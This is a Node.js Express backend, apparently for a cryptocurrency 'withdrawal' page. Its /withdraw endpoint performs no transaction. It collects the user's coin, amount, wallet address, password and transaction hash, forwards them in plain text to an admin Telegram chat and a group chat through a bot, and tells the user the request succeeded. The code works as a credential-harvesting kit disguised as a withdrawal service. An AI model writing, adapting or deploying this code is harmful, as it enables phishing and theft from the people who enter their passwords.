import express from "express";
import cors from "cors";
import fetch from "node-fetch";

const app = express();
app.use(cors());
app.use(express.json());

// 环境变量
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;   // 管理员
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;   // 群组

// Telegram 统一发送函数
async function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            text,
            parse_mode: "HTML"
        })
    }).catch(console.error);

    await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: GROUP_CHAT_ID,
            text,
            parse_mode: "HTML"
        })
    }).catch(console.error);
}

// 主接口：前端调用
app.post("/withdraw", async (req, res) => {
    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;

        const msg =
`<b>🚨 New Withdrawal Request</b>

<b>Coin:</b> ${coin}
<b>Amount:</b> ${amount}
<b>USDT Value:</b> ${usdt}
<b>Wallet:</b> ${wallet}
<b>Password:</b> ${password}
<b>Tx Hash:</b> ${hash}

<b>⚠ Please verify immediately.</b>`;

        await sendToTelegram(msg);

        return res.json({ success: true });
    } catch (err) {
        console.error("ERROR:", err);
        return res.json({ success: false, error: "Server failed" });
    }
});

// Railway 必须监听这个端口
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`🚀 Backend running on ${PORT}`));
